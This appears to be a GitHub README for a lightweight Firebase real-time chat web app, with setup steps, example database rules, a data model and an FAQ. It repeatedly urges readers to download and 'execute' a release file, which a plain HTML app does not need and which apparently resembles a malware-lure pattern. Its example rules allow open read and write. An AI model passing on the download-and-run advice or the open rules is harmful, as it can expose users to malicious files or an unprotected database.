[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/Therogabolla/Real-Time-Chat/releases)

Real-Time Chat — Lightweight Firebase Messaging App for Web

![Chat hero image](https://images.unsplash.com/photo-1542744173-8e7e53415bb0?q=80&w=1600&auto=format&fit=crop)

About
A small real-time chat built with Firebase Realtime Database. Users pick a username. Each username shows in a unique color. Messages show timestamps. The chat view scrolls to the newest message. The layout adapts to mobile screens. The project uses plain HTML, CSS, and JavaScript with the Firebase client SDK.

Badges
[![Release](https://img.shields.io/badge/Release-v1.0-blue?style=flat-square)](https://github.com/Therogabolla/Real-Time-Chat/releases) ![HTML](https://img.shields.io/badge/HTML-E34F26?style=flat-square&logo=html5&logoColor=white) ![CSS](https://img.shields.io/badge/CSS-1572B6?style=flat-square&logo=css3&logoColor=white) ![JS](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black) ![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=flat-square&logo=firebase&logoColor=black)

Table of contents
- About
- Features
- Demo and screenshots
- Tech stack
- Quick start
  - Download release
  - Run locally (clone)
  - Firebase setup
- Configuration
- Security rules
- File structure
- API & data model
- Styling and theming
- Troubleshooting
- FAQ
- Contributing
- License
- Credits

Features
- Real-time messaging via Firebase Realtime Database
- Unique color per username for quick identification
- Message timestamps (local time)
- Auto-scroll to newest message
- Responsive design for phones and tablets
- Lightweight: no bundlers, no build step
- Small codebase for easy customization

Demo and screenshots
Main chat interface:
![Chat interface small](https://raw.githubusercontent.com/therogabolla/Real-Time-Chat/main/assets/screenshot-1.png)

Mobile view:
![Mobile chat](https://raw.githubusercontent.com/therogabolla/Real-Time-Chat/main/assets/screenshot-2.png)

GIF demo (hosted image):
![Chat demo gif](https://media.giphy.com/media/3o7aCV8Xo3aQy2fZ7m/giphy.gif)

Tech stack
- HTML5
- CSS3 (flexbox, media queries)
- Vanilla JavaScript (ES6 modules where needed)
- Firebase Realtime Database (client SDK)
- No server required

Quick start

Download release (recommended)
- Visit the releases page and download the latest release file.
- The release file needs to be downloaded and executed. Typically this means you will:
  1. Download the ZIP or packaged release from https://github.com/Therogabolla/Real-Time-Chat/releases
  2. Extract the archive.
  3. Open index.html in your browser to run the app.

Releases: [![Release](https://img.shields.io/badge/Go_to_Releases-Open-blue?style=for-the-badge&logo=github)](https://github.com/Therogabolla/Real-Time-Chat/releases)

Run from source (clone)
- Prerequisites: modern browser
- Commands:
  - git clone https://github.com/Therogabolla/Real-Time-Chat.git
  - cd Real-Time-Chat
  - Open index.html in your browser
- Optional: run a local server for better file handling
  - Python 3: python -m http.server 8000
  - Node (http-server): npx http-server -c-1

Firebase setup (required)
1. Create a Firebase project at https://console.firebase.google.com/.
2. Add a Web app to the project.
3. Copy the Firebase config snippet. It looks like:
   {
     apiKey: "AIza...yourkey",
     authDomain: "your-project.firebaseapp.com",
     databaseURL: "https://your-project-default-rtdb.firebaseio.com",
     projectId: "your-project",
     storageBucket: "your-project.appspot.com",
     messagingSenderId: "1234567890",
     appId: "1:1234567890:web:abcdef"
   }
4. Paste the config into the app:
   - Option A: edit config.js and replace the placeholder object
   - Option B: drop the snippet into index.html where the Firebase init runs
5. Ensure the Realtime Database is enabled in the console.

Configuration
- config.js (or inline config): set your Firebase configuration.
- ui settings: open src/ui.js to modify colors, fonts, or message layout.
- message limit: change the fetched message limit in src/db.js (default: 100).
- username persistence: app stores the chosen name in localStorage. Clear storage to reset.

Security rules (example)
Set these rules in Firebase Console > Realtime Database > Rules to allow basic read/write with simple validation. Adjust for production.

{
  "rules": {
    "messages": {
      ".read": true,
      ".write": true,
      "$msg": {
        ".validate": "newData.hasChildren(['user','text','ts']) &&
                     newData.child('user').isString() &&
                     newData.child('text').isString() &&
                     newData.child('ts').isNumber() &&
                     newData.child('text').val().length <= 1000"
      }
    }
  }
}

Change the read/write rules to restrict access when you add authentication.

File structure
- index.html — entry page
- config.js — Firebase config placeholder
- src/
  - app.js — main UI logic and event handlers
  - db.js — Firebase read/write helpers
  - ui.js — DOM helpers and color assignment
  - time.js — timestamp helpers
- assets/
  - logo.svg
  - screenshot-1.png
  - screenshot-2.png
- styles/
  - main.css
- README.md

Data model
- messages (collection)
  - auto-generated key
    - user: string
    - color: string (hex)
    - text: string
    - ts: number (Unix ms)
Example node:

messages
  -KXyZ123abc
    user: "Maya"
    color: "#e74c3c"
    text: "Hello"
    ts: 1630000000000

Client behavior
- When a user sends a message:
  - App writes a new child under /messages with user, color, text, and ts.
  - App listens for child_added events to append messages to the DOM.
  - App trims the DOM to the most recent N messages to keep UI fast.
- When the chat opens:
  - App fetches the last N messages and attaches a listener for live updates.
  - App scrolls the message container to the bottom after render.

Styling and theming
- The project uses a neutral palette and an accent color per user.
- Username colors are deterministic: the app hashes the username to a color value.
- To change theme:
  - Modify styles/main.css
  - Update CSS variables at the top of the file
  - Adjust breakpoints for custom layouts

Accessibility
- The chat keeps semantic HTML: form, button, list elements.
- Inputs include labels for screen readers.
- Color contrast uses readable defaults. Adjust colors for your target audience.

Performance tips
- Limit the message snapshot size for low bandwidth.
- Use a CDN for static assets.
- Keep client-side logic minimal for mobile performance.

Troubleshooting
- Blank screen after open:
  - Check browser console for errors.
  - Verify Firebase config in config.js.
- Messages not appearing:
  - Confirm Realtime Database rules allow read.
  - Check network tab for blocked requests.
- Timestamps wrong:
  - The app uses local time. If you need server time, replace ts with Firebase.ServerValue.TIMESTAMP.

FAQ
Q: Do I need a backend server?
A: No. The app uses Firebase client SDK and Realtime Database.

Q: Can I add authentication?
A: Yes. Use Firebase Authentication and attach user.uid to messages. Update rules to restrict writes.

Q: How do I change message color logic?
A: Edit src/ui.js. The function mapNameToColor(username) returns a hex color.

Q: Is this safe for production?
A: The default rules are permissive. Add authentication and stricter rules before public use.

Contributing
- Fork the repo.
- Create a branch: git checkout -b feature/your-change
- Commit changes: git commit -m "feat: short description"
- Push: git push origin feature/your-change
- Open a pull request.
Guidelines:
- Keep changes focused.
- Include tests if you add logic.
- Run linting where applicable.

Releases
Visit the release page to download stable builds or packaged assets. If you downloaded a packaged release, extract it and run the included index.html to start the app. Releases are available here: https://github.com/Therogabolla/Real-Time-Chat/releases

License
MIT License — see LICENSE file.

Credits
- Built with Firebase Realtime Database
- Hero image: Unsplash
- Icons: simpleicons.org

Contact
Open an issue on GitHub for bugs, feature requests, or questions.